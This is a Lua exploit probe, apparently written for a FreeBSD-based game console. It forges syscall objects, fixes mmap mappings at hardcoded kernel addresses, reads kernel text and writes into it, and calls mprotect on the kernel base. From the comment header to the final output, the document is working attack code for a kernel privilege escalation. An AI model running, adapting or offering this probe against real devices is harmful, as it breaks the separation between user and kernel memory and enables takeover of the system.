-- CRASH_CLASS: HIGH
-- PROBE 821a: can the user map be extended over kernel addresses?
--
-- Context: sys 674 reports userland regions up to 0xF_E0400000, so this
-- console's user map is far larger than FreeBSD's default 0x7FFF_FFFF_F000.
-- If vm_map_max is the full 64-bit space, MAP_FIXED at a kernel VA may be
-- accepted by the user map even though the pmap already has kernel text
-- there. mmap installs a user-accessible PTE: if the read-back works, the
-- process can read (and write) kernel text directly.
--
-- Every read is guarded by "mmap reported success", because a fault outside
-- pcall terminates the process.

print("=== PROBE 821a: mapping the kernel range ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u(v)
    if type(v) == "table" then
        local h = to_num(v.h or v[1] or 0)
        local l = to_num(v.l or v[2] or 0)
        return uint64(h) * uint64(4294967296) + uint64(l)
    end
    return uint64(v)
end
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) end return nil end
local function safe_rq(a) local ok, v = pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function safe_wd(a, v) return (pcall(function() memory.write_dword(a, v) end)) end
local function hex(v) return string.format("%08X%08X", to_num(v.h or 0), to_num(v.l or 0)) end

local sc_mmap = make_syscall(477)
local sc_mprot = make_syscall(74)

-- 674 for the region map, so the read-back target is a real kernel address
local map = memory.alloc(0x10000)
local cnt = memory.alloc(8)
safe_wd(cnt, 0)
local rv674 = -1
pcall(function() rv674 = to_num(sc_mmap == nil and 0 or 0) end)
local sc674 = make_syscall(674)
pcall(function() rv674 = to_num(sc674(u(map), u(72), u(512), u(cnt), u(0x40000000), u(0))) end)

local targets = {
    { "13.60 kbase", 0xFFFFFFFF8A9C0000 },
    { "13.60 kmid ", 0xFFFFFFFF8B000000 },
    { "13.60 ktop ", 0xFFFFFFFF8C140000 },
    { "kernel neg ", 0xFFFF800000000000 },
    { "user ctrl  ", 0x0000000200000000 },
    { "high user  ", 0x0000000FE0000000 },
}

print(string.format("[A] 674 ret=%d regions=%d", rv674, safe_rd(cnt) or -1))
print("")

local ok = {}
for _, t in ipairs(targets) do
    local addr, name = t[2], t[1]
    local r = -1
    pcall(function() r = to_num(sc_mmap(u(addr), u(0x4000), u(3), u(0x1012), u(-1), u(0))) end)
    ok[addr] = (r == addr)
    print(string.format("[B] mmap %s %012X ret=%016X %s", name, addr, r,
        r == addr and "MAPPLIED" or "refused"))
end
print("")

-- read back only what mmap said it mapped
for _, t in ipairs(targets) do
    local addr, name = t[2], t[1]
    if ok[addr] then
        print(string.format("[C] %s read64=%s", name, safe_rq(u(addr)) and hex(safe_rq(u(addr))) or "FAULT"))
        print(string.format("[C] %s write+read=%s", name,
            safe_wd(u(addr), 0x41424344) and string.format("%08X", safe_rd(u(addr)) or 0) or "FAULT"))
    else
        print(string.format("[C] %s skipped (not mapped)", name))
    end
end
print("")

-- mprotect on a kernel VA, independent of the mmap result
local r = -1
pcall(function() r = to_num(sc_mprot(u(0xFFFFFFFF8A9C0000), u(0x4000), u(3))) end)
print(string.format("[D] mprotect kbase ret=%d", r))
print("[E] survived")
